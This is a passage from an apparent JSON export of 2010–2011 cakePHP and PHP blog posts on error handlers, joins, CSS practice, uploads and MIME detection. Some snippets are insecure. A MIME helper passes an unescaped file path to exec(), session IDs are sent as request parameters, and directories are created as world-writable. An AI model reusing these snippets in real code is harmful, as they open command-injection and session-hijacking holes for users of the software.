  "text": "<p>I often use <code>$this-&gt;cakeError('error404')</code> in my controllers to stop processing the request (and return a 404 error) when the supplied parameters are buggy or incomplete.</p>\n<h4>A strange side effect</h4>\n<p>I recently spotted a strange side effect on the latest site I was developping. It used a pretty large html footer filled with links dynamically fetched from my database.</p>\n<p>As all pages (no matter what model/controller they were refering to) were using the same footer, I created a component with a simple <code>startup</code> method to fetch them all and return them to the view. I added this component to my <code>AppController</code> so that every controller will inherit it.</p>\n<p>This worked nicely until I spotted that on error pages, the footer was left mostly empty. I was because my <code>Component</code> callback was never fired.</p>\n<h4>How's that ?</h4>\n<p>When detecting an error, cake starts using its <code>ErrorHandler </code>and thus do not fire callbacks.</p>\n<p>Fortunatly, you can create an <code>AppError </code>class (in <code>app/app_error.php</code>) and overwrite the <code>ErrorHandler </code>method. Namely, the <code>error404</code>. I rewrote mine to explicitly fire the <code>initialize</code> and <code>startup</code> methods.</p>\n<pre><code lang=\"php\">class AppError extends ErrorHandler {<br />\tfunction error404($params) {<br />\t\t$this-&gt;controller-&gt;Component-&gt;initialize($this-&gt;controller);<br />\t\t$this-&gt;controller-&gt;Component-&gt;startup($this-&gt;controller);<br />\t\tparent::error404($params);<br />\t}<br />}</code></pre>\n<p>I only fired two of the callbacks, but maybe <code>beforeRender </code>and <code>shutdown </code>should be fired too.</p>",
  "publish_start": "2011-01-06 18:24:49",
  "slug": "firing-cakephp-components-callbacks-error404"
}, {
  "id": 198,
  "name": "Allow click through an HTML element",
  "text": "<p>When one HTML element is over another one (like when positioning an element using <code>position:absolute</code>), you usually can't click through the top element to access the bottom element.</p>\n<p>That's used as a common technique to prevent the right click on images by some sites (like Flickr). They just add an empty transparent div over their images to prevent the lambda user from right clicking and saving the image.</p>\n<p>Sometimes, when integrating complex designs, you need those additional layers, but you also want the user to be able to click through them, as if they weren't there.</p>\n<p>Just use the <code>pointer-events:none</code> css property to allow click events to go through the element.</p>\n<p>This is only supported by Firefox 3.6+, Chrome and Safari for now.</p>",
  "publish_start": "2010-07-23 17:29:00",
  "slug": "click-html-element"
}, {
  "id": 199,
  "name": "Forcing joins in a cakePHP find",
  "text": "<p>Today I had to setup a complex find relation. Here is the simplifed version of what I had :</p>\n<pre><code lang=\"ini\">TABLE timestamps<br />int id<br />datetime date<br />string type<br />int user_id<br /></code></pre><p>The type field only had two types of values : <code>START </code>and <code>END</code>. As you can guess, this was used to log the time users where using an application. Every time a user started using the app, a <code>START</code> record was created, and when he loggued out, an <code>END </code>record was created. So basically, the records where working as pairs.</p>\n<p>I wanted to get a list of all records that could be easily displayed. I wanted to bind the timestamp model to itself, so that when querying all the start records, I'll automatically have the end ones as related models.</p>\n<p>Here's how I did that :</p>\n<pre><code lang=\"php\">$this-&gt;find('all', array(<br />\t'conditions' =&gt; array(<br />\t\t'Timestamp.type' =&gt; 'START'<br />\t),<br />\t'joins' =&gt; array(<br />\t\tarray(<br />\t\t\t'table' =&gt; 'timestamp',<br />\t\t\t'alias' =&gt; 'EndTimestamp',<br />\t\t\t'type' =&gt; 'LEFT',<br />\t\t\t'conditions' =&gt; array(<br />\t\t\t\t'EndTimestamp.type' =&gt; 'END',<br />\t\t\t\t'EndTimestamp.user_id = Timestamp.user_id',<br />\t\t\t\t'EndTimestamp.date &gt; Timestamp.date',<br />\t\t\t)<br />\t\t)<br />\t),<br />\t'order' =&gt; array(<br />\t\t'Timestamp.date' =&gt; 'ASC'<br />\t),<br />\t'group' =&gt; 'Timestamp.date'<br />));<br /></code></pre><p>It will fetch all the start timestamp (<code>fields</code>) in chronological order (<code>order</code>). We will also define a custom join relation (<code>joins</code>). We set the table name and the alias we need, and set it as a <code>JOIN LEFT</code>.</p>\n<p>Then we add the conditions : we want only the <code>END </code>records, that belongs to the same user, and that occurs after the <code>START </code>records. We also add a <code>group </code>key to make sure not to get twice the same result (or it will corrupt our results)</p>\n<p>Note that the joins syntax needs to be wrapped in an unkeyed array. This is because you may need to add several joins.</p>\n<p>I had never heard of this joins key before today, but it is quite handy, I guess I'll use it again.</p>",
  "publish_start": "2010-07-23 21:48:00",
  "slug": "forcing-joins-in-a-cakephp-find"
}, {
  "id": 200,
  "name": "Adding some logic in your MySQL",
  "text": "<p>I'm not an expert in SQL queries, I just know how to do simple queries and the more advanced options I've ever used are <code>DISTINCT</code>, <code>HAVING </code>and <code>GROUP BY</code>.</p>\n<p>For the project I'm working on, I had to add some logic to my SQL queries, to concatenate various field and compare them.</p>\n<p>Here is, as a reminder, how I've managed to I've managed to get the time spent by comparing two dates :</p>\n<pre><code lang=\"ini\">TIMESTAMPDIFF(SECOND, Timestamp.date, EndTimestamp.date) AS timeSpent</code></pre><p>And is practice is never as easy as theory, I didn't really had a timestamp but two string fields instead (one <code>date </code>and one <code>time</code>), so here's how I combined them</p>\n<pre><code lang=\"ini\">TIMESTAMPDIFF(SECOND, CONCAT(Timestamp.date, \" \", Timestamp.time), CONCAT(Timestamp.date, \" \", Timestamp.time)) AS timeSpent<br /></code></pre><p> </p>",
  "publish_start": "2010-07-23 22:43:00",
  "slug": "adding-some-logic-in-your-mysql"
}, {
  "id": 201,
  "name": "7 advices to start using OOCSS as a coding practice",
  "text": "<p>Not long ago, I stumbled across this <a title=\"Top 5 mistakes of massive CSS\" href=\"http://www.stubbornella.org/content/2010/07/01/top-5-mistakes-of-massive-css/\" target=\"_blank\">video about massive and unmaintainable CSS files</a> from Nicole Sullivan. It made me want to try OOCSS.</p>\n<p><a title=\"OOCSS\" href=\"http://wiki.github.com/stubbornella/oocss/\" target=\"_blank\">OOCSS </a>is a way to code css in a way that replicates the goodies general OOP told us. Classic CSS use the cascade in selectors to emulate a concept of inheritence.</p>\n<p>OOCSS puts the concept of inheritence a little step further by telling  us to create \"modules\" in our CSS files. Each module represent a  \"widget\" of our page, or should I say of our whole site.</p>\n<p>It comes with a simple list of principles that could allow one to write much more flexible and maintainable code. I rewrote the whole CSS for this website (as well as the admin interface I'm using behind the doors) following those principles, and I thought I'll share it with you.</p>\n<h4>Drop the <code>#id</code> selector</h4>\n<p>We won't be using the <code>#id</code> selector anymore (except for some edge cases). Instead of <code>#commentList {}</code> we'll use <code>.commentList {}</code></p>\n<p>This change alone lets us reuse the same element multiple times on the same page.</p>\n<p>Note that we will still add <code>ids</code> in our HTML markup for form inputs or for Javascript purpose (<code>document.getElementById</code> is still the faster selection method).</p>\n<h4>Don't make your selector dependent on the page structure</h4>\n<p>We won't style our elements based on where they will be displayed in the page.</p>\n<p>We don't care if our module will be displayed in a footer, sidebar, specific page or whatever. We just style it all the same.</p>\n<p>Instead of writing <code>.sidebar .lastComments {}</code>, we will go for the shorter <code>.lastComments {}</code>.</p>\n<p>This will allow us to easily display the last comments on any page, anywhere. You should carefully name your modules to something that clearly evoke what the module is supposed to display, without ambiguity.</p>\n<p>If you need to tweak the display of an element in a certain part of the page, you could always write a specific selector for this specific need, that will overwrite the default rules. But this must not be your default selector.</p>\n<h4>Do not use both tag and class selector on the same element</h4>\n<p>Avoid the <code>div.errorMessage</code>, <code>ul.userList</code> selectors. The first one is just too specific : what happen if you ever want to style a <code>&lt;p&gt;</code> instead of a <code>&lt;div&gt;</code> ? The second one is useless, <code>&lt;ul&gt;</code> is a list by definition.</p>\n<p>There is only one moment when being that specific can be useful, it is when you need to overwrite, for a specific element, rules defined for the class. Fortunatly, thanks to the OOCSS coding style, this won't happen much.</p>\n<h4>Don't make your selectors over-specific</h4>\n<p>This is a followup of the previous rule, but don't write overly specific rules, like .<code>userList table thead tr th a</code>. A simple <code>.userList thead a</code> is enough.</p>\n<p>First, you are overly detailing each level of the markup while most of the time the uppermost and lowermost parts are enough. But you also define useless selectors like <code>tr th</code> or <code>ul li,</code> where <code>th</code> or <code>li</code> are enough (those elements can not be placed in any other parent element).</p>\n<h4>Create your own reset stylesheet</h4>\n<p>To avoid repeating <code>margin:0; padding:0</code> over and over in your stylesheets, you should spend some time finding a reset stylesheet that you like and then tweaking it to fit your coding practice.</p>\n<p>I used to include the <a title=\"Tripoli CSS\" href=\"http://devkick.com/lab/tripoli/\" target=\"_blank\">Tripoli framework</a> in my previous projects but I found that I had to reset styles it was settings far too often.</p>\n<p>All reset stylesheets are not equals, some will just remove all styling from elements, letting you define them as you want. Others will also assign default rendering styles to make something both visually beautiful and cross-browser.</p>\n<p>But the best reset stylesheet you'll get is the one you'll create (or, as it is quite a bit of work, tweak) yourself.</p>\n<h4>Use a grid system to place elements</h4>\n<p>Some years ago, I found CSS Framework like Blueprint to be a waste of time. I didn't want to clutter mu HTML markup with <em>non-semantic</em> classes for handling the styling.</p>\n<p>I also found that the psd files I was given to integrate couldn't fit in grids because the sidebar was 173px wide for example.</p>\n<p>Now I still don't think cluttering the HTML with <code>span-6 pull-2</code> is the best thing that happened to CSS, but I found it much better than cluttering my CSS with endless <code>overflow:hidden</code> and <code>float:left; margin-right:10px</code> declarations.</p>\n<p>And I still got design from not-so-professional designers to integrate that do not seems to have any logical proportion, and can't fit them in grids. But I also work with more talented people that deliver beautiful design and they tend to be the one that fits easily into grids.</p>\n<p>So it may not always be possible to use a grid system, but more often than not, it is and even if that means tweaking the original (badly designed) design a dozen pixels off, it will greatly help the CSS process.</p>\n<h4>Create a global stylesheet for your main classes</h4>\n<p>I also create a main stylesheet for all the classes I know I'll be reusing all accross this project (and others). I include it at the top, right after the reset one.</p>\n<p>In it I'll defined general classes that could be extended by all the other inner classes later. Like a <code>.message</code> class, that I may be extending later using <code>.message.error</code> or .<code>message.success</code></p>\n<h4>One final word</h4>\n<p>Ok, this is it. I'm fairly new to OOCSS too, so I'm still discovering it too. So far I found that I have greatly reduce the size of my files but most importantly, my styles are way more easy to tweak for special needs than before.</p>\n<p>It also helped me separate the various elements of the website, and it is much more easier to find the piece I need. Fewer classes to depends on means I know where the rules are coming from and I can write more specific selectors if need me more easily.</p>",
  "publish_start": "2010-08-11 12:39:00",
  "slug": "7-advices-to-start-using-oocss-as-a-coding-practice"
}, {
  "id": 251,
  "name": "Detecting fullscreen in tinyMCE",
  "text": "<p>I wanted one of my tinyMCE plugins to fire a certain set of actions whenever the full screen mode was activated.</p>\n<p>I search for an <code>onFullScren </code>event or somethin similar but to no avail. I finally discovered that the full screen actually creates a whole new tinymce editor instance.</p>\n<p>So the only thing I had to do was writing my little piece of code in the <code>init </code>method of my plugin and check to see if the fullscreen was enabled.</p>\n<p>The initial fullscreen plugin exposes a <code>fullscreen_is_enabled</code> param that can be checked.</p>\n<p>All I had to do was a simple condition like : <code>if (editor.getParam('fullscreen_is_enabled')) {}.</code> And once in the condition I tried to execute my custom code. I needed the <code>editor.execCommand</code> method but all I got was an error because <code>t.selection</code> was not set.</p>\n<p>It appears that the execCommand can only be executed when the full editor instance is loaded (and thus a t.selection is created). So I wrap my little piece of code into a <code>setInterval</code> checking for <code>editor.selection</code> and finally executed my code when the <code>.selection </code>was set.</p>\n<p>Here is my final snippet, to be included in my plugin <code>init </code>method :</p>\n<pre><code lang=\"js\">if (editor.getParam('fullscreen_is_enabled')) {<br />\tvar fullScreenInterval = setInterval(function() {<br />\t\tif (!editor.selection) return false;<br />\t\tclearInterval(fullScreenInterval);<br />\t\teditor.execCommand('anyTinyMCECommand');<br />\t}, 1000);<br />}</code></pre>\n<p> </p>",
  "publish_start": "2011-01-03 17:45:31",
  "slug": "detecting-fullscreen-tinymce"
}, {
  "id": 253,
  "name": "Moving from Delicious to Pinboard",
  "text": "<p>As you may have heard, Yahoo! is closing <a title=\"Delicious\" href=\"http://www.delicious.com/\" target=\"_blank\">Delicious</a>. I had started to use Delicious a lot lately, to work as a decentralised save of all my bookmarks and being able to search through them easily.</p>\n<p>In my recent attempt to save as much of my work online, losing Delicious would meant losing a large part of collective wisdom. So I search for an alternative.</p>\n<p>I finally registered for <a title=\"Pinboard\" href=\"http://pinboard.in/\" target=\"_blank\">Pinboard </a>a few days ago. It allows an easy way to import Delicious bookmarks in a matter of seconds and has all the features of Delicious I wanted.</p>\n<p>It is not free however, but the one-time fee depends on the number of people using the service. I payed mine 9.12$.</p>\n<p>The website itself is not as good looking as Delicious (*ahem*), but it does provide a cleaner search experience (in my point of view). I really don't care about other people bookmark, I only search through mine.</p>",
  "publish_start": "2011-01-04 17:21:26",
  "slug": "moving-delicious-pinboard"
}, {
  "id": 208,
  "name": "SWFUpload and cakePHP",
  "text": "<p>One thing that always sent me an awful hours of debugging is the fact that the Flash player identify itself as a whole different browser that the one it is integrated into.</p>\n<p>I've ran into this issue multiple times when dealing with SWFUpload and today was one more. As I always spent quite a lot of time debugging issues arising from this, I guess I should post about it here.</p>\n<h4>The Flash player uses a different userAgent that your browser</h4>\n<p>Most of the time, this is not a problem. But when dealing with restricted areas of a website built on top of cakePHP, it can become one.</p>\n<p>The thing is that as the <code>userAgent </code>string used by the Flash player is not the same as the one used by your browser. So, when you make a request to your site, cake will see that as whole new request and you won't be able to access your current session variables.</p>\n<p>As you can't overwrite the <code>userAgent </code>hash sent, you need to send the <code>sessionId </code>along with your flash request. That way, you'll be able to call a</p>\n<pre><code lang=\"php\">$this-&gt;Session-&gt;id($sessionId);<br />$this-&gt;Session-&gt;start();</code></pre>\n<p>in your controller <code>beforeFilter </code>(or component <code>initialize</code>)</p>\n<p><em>In cake 1.2, you'll also have to call <code>$this-&gt;Session-&gt;destroy()</code> before to delete the Flash session created.</em></p>\n<h4>The Flash player uses a different cookie pool that your browser</h4>\n<p><em>This used to be an issue in 1.2 but not longer is.</em></p>\n<p>Cake stores in a cookie the name of the session you're supposed to use. Flash having its own cookie pool, it will save its own cookie (usually somewhere you don't even know) and will always check for the session specified inside.</p>\n<p>This took me quite a long time to found out why the flash request where reading an other request that the one I was setting.</p>\n<p>In 1.2, you needed to delete the cookie created by cake whenever you made a flash request to avoid conflicts</p>\n<pre><code lang=\"php\">setcookie(Configure::read('Session.cookie'), '', time() - 42000, $this-&gt;Session-&gt;path);<br /></code></pre>\n<h4>cakePHP used to overwrite the userAgent string in session</h4>\n<p>In cake 1.2, when you manually change the current session, cake would update the inner <code>userAgent </code>hash saved to your current userAgent hash.</p>\n<p>This meant that whenever you were moving from the Flash session to the correct session, you had to overwrite the <code>userAgent </code>hash to the correct one.</p>\n<pre><code lang=\"php\">$this-&gt;Session-&gt;write('Config.userAgent', $userAgent);<br /></code></pre>\n<p><em>This is no longer the case in 1.3, changing the current session does not alter it anymore.</em></p>\n<h4>Doesn't all that stuff alter security ?</h4>\n<p>Well, most of the answers I found online were among the lines of \"Just disable the check of the <code>userAgent</code>\", so I think my method is a little bit more secure.</p>\n<p>Anyway, passing a <code>sessionId </code>as a parameter seems a little risky, even to me. I guess there should be a way of encrypting it to not pass it as clear text</p>\n<h4>UPDATE !</h4>\n<p>I had to fiddle with this script some more. It appears that, as we are changing the <code>sessionId</code>, we need to do that BEFORE we access the session. It means that any call to <code>Session::read()</code> or <code>Session::check()</code>, or almost any other Session method BEFORE setting the id will block this trick from working. So, make sure that this code is executed before anything else, put it in a component that will be loaded first.</p>\n<p>It also appears that if you follow my advice, you'll only have to call <code>id($sessionId)</code>, and none of the hocum pocum about <code>destroy</code>, <code>write </code>and <code>userAgent </code>hashes I talked about...</p>\n<p>I just lost some hours finding this out. I add a call to Session in my <code>I18n </code>component that was rendering this whole fix useless. It was driving me crazy...</p>",
  "publish_start": "2010-08-03 19:51:00",
  "slug": "swfupload-and-cakephp"
}, {
  "id": 209,
  "name": "Creating dirs with correct chmod in PHP",
  "text": "<p>One trick I've been dragging with me on all this years of PHP programing is a little snippet to correctly create directories with the chmod I want.</p>\n<p>By simply calling <code>mkdir('my_dir', 0777)</code> I used to often end up with directories that I can't write to nor delete, even if I was correctly setting the chmod.</p>\n<p>The trick was to reset the mask (using <code>umask(0)</code>) before the <code>mkdir() </code>call and then reapplying the old mask after.</p>\n<pre><code lang=\"php\">$tmpUmask = umask(0);<br />mkdir('my_dir', 0777);<br />umask($tmpUmask);<br /></code></pre>\n<p>I must admit that I've never really understand why it was working better than simply calling <code>mkdir()</code> but hey, it's been years that I'm using that now and I never run into access rights issues since.</p>",
  "publish_start": "2010-08-04 14:51:00",
  "slug": "creating-dirs-with-correct-chmod-in-php"
}, {
  "id": 210,
  "name": "Testing file uploads in PHP",
  "text": "<p>I just had to write unit tests for a file upload script I had to write. As it is not <a title=\"The question I asked on Stack Overflow\" href=\"http://stackoverflow.com/questions/3402765/how-can-i-write-tests-for-file-upload-in-php/3410684#3410684\" target=\"_blank\">that easy</a> <a title=\"Same question asked in french on an old topic\" href=\"http://www.foonews.info/fr-comp-lang-php/10256260-tests-unitaires-formulaire-dupload-de-fichier.html\" target=\"_blank\">to do</a>, I'll share my findings with you.</p>\n<p>My problem was on how I was going to simulate a file upload in a test case. Sure I could simulate a whole post request either using curl of simpleTest webtester. But that would only give me a full overview of the upload process, not its inner details.</p>\n<p>There was <a title=\"Using PHPT to do that\" href=\"http://www.mail-archive.com/internals@lists.php.net/msg35782.html\" target=\"_blank\">a way to do that</a> using <a title=\"PHPT\" href=\"http://qa.php.net/phpt_details.php#post_raw_section\" target=\"_blank\">PHPT</a>, which seems to be the unit tests used by PHP itself. It is supposed to simulate any kind of query. Unfortunatly, setting that up seemed a little to complex for me.</p>\n<h4>So, how did I do ?</h4>\n<p>I finally found a way to do that by :</p>\n<ol>\n<li>Spoofing the <code>$_FILES</code> array and putting arbitrary test data inside</li>\n<li>Copying a test file to the <code>tmp/</code> directory for testing purpose. Actually the directory does not matter (see 3.)</li>\n<li>Wrapping all calls to <code>move_uploaded_file</code> and <code>is_uploaded_file</code> to its own methods. Those two php methods won't work with dummy upload because they weren't really uploaded through <code>POST</code></li>\n</ol>\n<p>So, instead of calling <code>move_uploaded_file</code>, I called <code>$this-&gt;moveUploadedFile()</code>, and instead of calling <code>is_uploaded_file()</code>, I called <code>$this-&gt;isUploadedFile()</code></p>\n<p>And when times comes to test my class, I just extends the class, overwrite those two methods with new one that uses <code>rename() </code>and <code>file_exists()</code> instead.<code><br /></code></p>\n<h4>What does that change ?</h4>\n<p>The fondamental difference between the former and the latter functions is that the former checks that the target really was uploaded through POST while the latter does not care.</p>\n<p>It is extremely important that you use the correct upload method because it provide an additional security check. If you just blindly <code>rename()</code> files specified by your user, you'll ending up putting the <code>database.php</code> and <code>config.php</code> files in the webroot renamed as <code>i_want_to_be_hacked.txt</code></p>\n<p>The other good news is that by wrapping those methods around those functions, you can create mock objects and test all the various return scenarios.</p>",
  "publish_start": "2010-08-04 16:17:00",
  "slug": "testing-file-uploads-in-php"
}, {
  "id": 212,
  "name": "Disabling PHP scripts in a directory",
  "text": "<p>Say you want to disable PHP scripts in a whole directory. Like your <code>upload/</code> directory, because you don't want your users to upload <code>.php</code> files with direct webroot access on your server...</p>\n<p>Just drop a <code>.htaccess</code> file in it, and add the following rules</p>\n<pre><code lang=\"apache\"># We don't want php files from being parsed by the server in this directory, so we will return them as plain text<br />AddType text/plain .php .php3 .php4 .php5 .php6 .phtml<br /><br /># Or, if the first rule does not work on your server, you may want to completely turn off PHP<br />#php_flag engine off<br /></code></pre>\n<p> </p>",
  "publish_start": "2010-08-04 23:33:00",
  "slug": "disabling-php-script-in-a-directory"
}, {
  "id": 211,
  "name": "Calling a parent method with arguments in PHP",
  "text": "<p>For testing purpose I just needed to overwrite an existing class to add some more logic to some methods before returning a call to its parent method.</p>\n<p>I needed to do that in a test case to save in an inner variable the result so I can clean up my mess after each test ran.</p>\n<p>The key is calling <code>call_user_func_array</code> with the right syntax. It seems that some version of PHP prior to 5.3 choke (like in segmentation fault) if an alternate syntax is given.</p>\n<p>Here is what worked for me :</p>\n<pre><code lang=\"php\">class TestDocument extends Document {<br />    function foo() {<br />        return $this-&gt;fooResult= call_user_func_array(array('parent', 'foo'), func_get_args());<br />    }<br />}<br /></code></pre>\n<p> </p>",
  "publish_start": "2010-08-04 17:49:00",
  "slug": "calling-a-parent-method-with-arguments-in-php"
}, {
  "id": 213,
  "name": "The all-in-one method to get mimetypes with PHP",
  "text": "<p>Getting the correct mimetype from a file in PHP is not an easy task. I used to find it through extension sniffing of the file combined with a known list of mimetypes.</p>\n<p>Today I needed to find the correct mimetype to do some security checks on file uploaded by users. I couldn't rely on an extension-based approach because the filename could easily be faked by an uploader.</p>\n<p>So I needed an other way. In fact, in PHP world there are at least 4 methods I'm aware of to get this information.</p>\n<h4>mime_content_type</h4>\n<p>The classic PHP function <a title=\"mime_content_type\" href=\"http://fr2.php.net/manual/en/function.mime-content-type.php\" target=\"_blank\">mime_content_type</a> is supposed to return just that. Unfortunatly, it is deprecated. And not supported by Dreamhost, my host.</p>\n<h4>The FileInfo functions</h4>\n<p>We are now encouraged to use the <a title=\"Fileinfos functions\" href=\"http://php.net/manual/en/ref.fileinfo.php\" target=\"_blank\">Fileinfo functions</a> instead of <code>mime_content_type</code>. Unfortunatly, they seems to be returning <a title=\"Fileinfo function dubious results\" href=\"http://www.php.net/manual/en/ref.fileinfo.php#79063\" target=\"_blank\">strange results</a>. Alternatively, they are not supported by Dreamhost either (but it seems that you can ask them to install it on your server).</p>\n<p>It is bundled into EasyPHP for Windows, but you need to enable it by uncommenting the line <code>extension=php_fileinfo.dll</code> in your <code>php.ini</code></p>\n<p>And you use it like this :</p>\n<pre><code lang=\"php\">$finfo = finfo_open(FILEINFO_MIME);<br />$mimeType = finfo_file($finfo, $filepath);<br />finfo_close($finfo);<br /></code></pre>\n<p>Also note that the mimetype may be returned in a <code>text/plain; charset=us-ascii</code> form. You may need to parse the result to get it in the format you need.</p>\n<h4>The getimagesize function</h4>\n<p>The <a title=\"getimagesize\" href=\"http://fr2.php.net/manual/en/function.getimagesize.php\" target=\"_blank\">getimagesize</a> function can be called on any image file. It will return an array containing image informations like <code>width</code>, <code>height </code>and of course the <code>mimetype</code>.</p>\n<p>Unfortunatly, it will cause a <code>E_WARNING</code> if called on a non-image file. You can't even catch that using a <code>try/catch</code>. You can suppress the error using <code>@</code>, tho.</p>\n<p>Here's how I use it :</p>\n<pre><code lang=\"php\">$imageData = @getimagesize($filepath);<br />if (!empty($imageData['mime'])) {<br />\t$mimeType = $imageData['mime'];<br />}<br /></code></pre>\n<h4>Calling the system file</h4>\n<p>The last method I'm aware of is simply calling the <code>file </code>command on a unix system through <code>exec</code>.</p>\n<pre><code lang=\"php\">$mimeType = exec(\"/usr/bin/file -i -b $filepath\");<br /></code></pre>\n<p>Merging all that into one do-it-all method</p>\n<p>If you're not sure what your system is capable of or if you plan on distributing your code, you'd better test for all alternatives. Here's the code I'm using :</p>\n<pre><code lang=\"php\">/**<br /> *    mimetype<br /> *    Returns a file mimetype. Note that it is a true mimetype fetch, using php and OS methods. It will NOT<br /> *    revert to a guessed mimetype based on the file extension if it can't find the type.<br /> *    In that case, it will return false<br /> **/<br /> function mimetype($filepath) {<br />\t // Check only existing files<br />\t if (!file_exists($filepath) || !is_readable($filepath)) return false;<br /><br />\t // Trying finfo<br />\t if (function_exists('finfo_open')) {<br />\t\t $finfo = finfo_open(FILEINFO_MIME);<br />\t\t $mimeType = finfo_file($finfo, $filepath);<br />\t\t finfo_close($finfo);<br />\t\t // Mimetype can come in text/plain; charset=us-ascii form<br />\t\t if (strpos($mimeType, ';')) list($mimeType,) = explode(';', $mimeType);<br />\t\t return $mimeType;<br />\t }<br /><br />\t // Trying mime_content_type<br />\t if (function_exists('mime_content_type')) {<br />\t\t return mime_content_type($filepath);<br />\t }<br /><br />\t // Trying exec<br />\t if (function_exists('exec')) {<br />\t\t $mimeType = exec(\"/usr/bin/file -i -b $filepath\");<br />\t\t if (!empty($mimeType)) return $mimeType;<br />\t }<br /><br />\t // Trying to get mimetype from images<br />\t $imageData = @getimagesize($filepath);<br />\t if (!empty($imageData['mime'])) {<br />\t\t return $imageData['mime'];<br />\t }<br /><br />\t return false;<br /> }</code></pre>\n<p>Hope that helps !</p>",
  "publish_start": "2010-08-05 00:34:00",
  "slug": "the-all-in-one-method-to-get-mimetypes-with-php"
}, {
  "id": 214,
  "name": "One thing that may turn me to Ruby : LESS",
  "text": "<p>I often hear how Ruby is better than PHP, that cakePHP is only a port of the Ruby on Rail framework and that the original is much more powerful.</p>\n<p>Well, I've been tempted to try and learn Ruby for some quite time now. But I've been a little scared by the fact of having to learn a whole new language when I'm now getting pretty good with cake.</p>\n<p>That and the shortage of hosts with a support for Ruby out there keep me away from it.</p>\n<h4>LESS, a Ruby only little gem</h4>\n<p>But one thing that may change my mind is <a title=\"LESS\" href=\"http://lesscss.org/\" target=\"_blank\">LESS</a>, the CSS as it should have been written since day one. It allows, in an extremely simple syntax, to define variables, functions, nested definitions, easier selectors.</p>\n<p>Unfortunatly, the parser only exists as a Ruby gem, too bad for my php apps.</p>\n<h4>Why I don't use the javascript version</h4>\n<p>There is <a title=\"LESS JS\" href=\"http://fadeyev.net/2010/06/19/lessjs-will-obsolete-css/\" target=\"_blank\">Javascript version</a> of the parser, but I don't like the idea of having CSS rendering based on script execution. It means that if I'm browsing without scripts enabled, I won't have any styling.</p>\n<p>Styling and Scripting are two very different things, one should work without the other and <em>vice versa</em></p>\n<p>So maybe, when the syntax will be parsed directly by browsers (one could dream...), or if a PHP parser is released I'll try it right away, but until them, I'll stick with my rusty CSS.</p>\n<h4>LESS in PHP ?</h4>\n<p><em>Well, some hours after posting this I just stumbled upon <a title=\"LESS in PHP\" href=\"http://leafo.net/lessphp/\" target=\"_blank\">that</a>. I guess I'll try LESS in php world after all !</em></p>",
  "publish_start": "2010-08-05 11:39:00",
  "slug": "one-thing-that-may-turn-me-to-ruby-less"
}, {
  "id": 215,
  "name": "Disabling a Behavior from inside its setup() method",
  "text": "<p>Sometime you write a nice Behavior, that will automate a lot of stuff that almost all your models will need. But, unfortunatly, a couple of models won't need it. Actually, attaching it to them will even break your code.</p>\n<p>So what do you do ? Do you resort to manually fill the <code>$actsAs</code> variable of each model, except for the two lonely loosers, or defining the <code>$actsAs</code> of your main <code>AppModel </code>really seems more appaling ?</p>\n<h4>Lazyness to the rescue</h4>\n<p>If, like me, you prefer writing less code, you'd probably go with the <code>AppModel</code> approach. All you have to do is define a <code>setup()</code> method in your Behavior and check if it is applied to the right or wrong type of model. Fortunatly for us, the <code>$model</code> is passed as first argument.</p>\n<p>Once you've identified the faulty models, you just have to disable the behavior for them. The <code>BehaviorCollection </code>that comes bundle into <code>$model-&gt;Behaviors</code> has a nice couple of <code>enable</code>/<code>disable</code> methods. Unfortunatly, they won't work from inside the <code>setup()</code> method because the Behavior is not yet correctly instanciated.</p>\n<p>What you can do, however, is to hack inside the <code>BehaviorCollection </code>to update the inner <code>_disabled</code> key to add your own Behavior to the list.</p>\n<pre><code lang=\"php\">function setup(&amp;$model, $config = array()) {<br />        [...]<br />\tif ($faultyModel) {<br />\t        $model-&gt;Behaviors-&gt;_disabled[] = 'MyBehavior';<br />\t}<br />}<br /></code></pre>\n<p>This is more than a bit hacky, I have to admit that. But it does the trick. Enjoy.</p>",
  "publish_start": "2010-08-06 16:18:00",
  "slug": "disabling-a-behavior-from-inside-its-setup-method"
}, {
  "id": 216,
  "name": "Correctly instanciating models in components",
  "text": "<p>I sometime need access to a specific model in a component. Say a <code>User </code>model for checking user rights in an <code>Auth </code>component. In that cases, I just create an instance of the model by calling a <code>$myModel = &amp;ClassRegistry::init($myModelName)</code>. It works perfectly.</p>\n<p>Today I found that it wasn't working exactly as I wanted. In fact, behaviors used by models loaded that way are not completely set up. All their callback methods (<code>beforeFind</code>, <code>afterFind</code>, <code>beforeSave</code>, <code>afterSave</code>) works as expected, but the main <code>setup</code> method is never called.</p>\n<p>This caused some havoc in my app because some <strong>reaaaaally </strong>important stuff was defined in the <code>setup</code> method</p>\n<h4>There I fixed it</h4>\n<p>I just manually fired all the <code>setup</code> methods by calling a simple :</p>\n<pre><code lang=\"php\">foreach($myModel-&gt;Behaviors-&gt;_attached as $behaviorName) {<br />\t$myModel-&gt;Behaviors-&gt;{$behaviorName}-&gt;setup($myModel);<br />}<br /></code></pre>\n<p>Once again, small fix, but does the trick. I did not file a bug report because I'm not really sure this is bug or if that is so by design.</p>",
  "publish_start": "2010-08-06 17:52:00",
  "slug": "instanciating-models-in-components"
}, {
  "id": 218,
  "name": "Testing a custom ErrorHandler in cakePHP",
  "text": "<p>I just finished writing the test case for a custom <code>AppError </code>class. Writing the tests case was indeed much more difficult than writing the class itself.</p>\n<p>Here are some things I've found that may interest anyone wanting to test their own <code>ErrorHandlers</code>. Most of the ideas are taken from the core <code>ErrorHandlerTest</code>.</p>\n<h4>Anatomy of an error</h4>\n<p>Every class in cakePHP extends <code>Object</code>. And in <code>Object </code>is defined a method named <code>cakeError</code>. It means that anywhere in your app you can call <code>$this-&gt;cakeError(</code>) and the whole app will stop and display the specified error.</p>\n<p>What <code>cakeError </code>does is instantly create an instance of either <code>Controller </code>or <code>CakeErrorController</code>, find the correct view, render it, and stop.</p>\n<p>Because of the use of static variables, <code>exit </code>calls and other happyness, testing several errors in a test case needs us to define some new classes to shortcircuit most of the logic.</p>\n<h4>Preparing the test</h4>\n<p>This step is actually pretty short. Just load the default <code>ErrorHandler </code>by calling <code>App::import('Core','Error');</code></p>\n<h4>Creating a dummy AppController</h4>\n<p>Then, you'll have to create a new <code>AppController </code>class that extends <code>Controller</code>.</p>\n<p>We will override the <code>header </code>method to prevent '<em>Headers already set</em>' error when calling several errors in a row.</p>\n<p>We will also override the <code>render</code> method to store in an inner property the name of the rendered action. It will help test that the correct error is rendered.</p>\n<p>You may also need to define a custom list of helpers if your custom views are using any custom helpers.</p>\n<p>Here is what it looks like on my side :</p>\n<pre><code lang=\"php\">class AppController extends Controller {<br />\t// Helpers used in the view. If not set, will generate a fatal error<br />\tvar $helpers = array('Caracole.Fastcode', 'CaracolePacker.Packer');<br 